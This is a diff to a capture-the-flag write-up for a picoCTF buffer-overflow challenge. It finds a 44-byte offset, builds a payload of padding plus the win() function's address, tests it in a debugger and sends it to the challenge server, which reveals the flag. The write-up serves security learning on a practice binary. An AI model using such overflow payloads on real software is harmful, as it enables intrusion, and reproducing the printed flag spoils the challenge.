@@ -26,10 +26,35 @@ b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
 
 <img width="1690" height="501" alt="image" src="https://github.com/user-attachments/assets/a3a4d37d-46f6-4b09-a186-52fdcc903f3d" />
 
-* The offset is bits
+* The offset is 44 bits
 ```
 >>> print(cyclic_find(0x6161616c))
 44
 ```
+
+* With this knowledge, we can craft a payload!
+
+```
+>>> "A"*44
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+>>> p32(0x80491f6)
+b'\xf6\x91\x04\x08'
+```
+
+* Inputting 44 A's along with helo outputs helo
+<img width="1269" height="731" alt="image" src="https://github.com/user-attachments/assets/82a39eaf-07d9-4fe1-9845-9cc1997930c0" />
+
+* Now, instead of hello, we do ```\xf6\x91\x04\x08```
+
+```
+r <<< $(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")
+```
+<img width="1160" height="98" alt="image" src="https://github.com/user-attachments/assets/704d9f8d-2c67-4ad8-b6db-e1cce9db0fcf" />
+
+* This code successfuly jumps to the win() address so we know this payload works
+* Now test this payload against the server
+<img width="1383" height="110" alt="image" src="https://github.com/user-attachments/assets/fc2fb10b-c798-4e70-a26f-1fb6776f5f85" />
+
+* That's the flag! picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
 
 
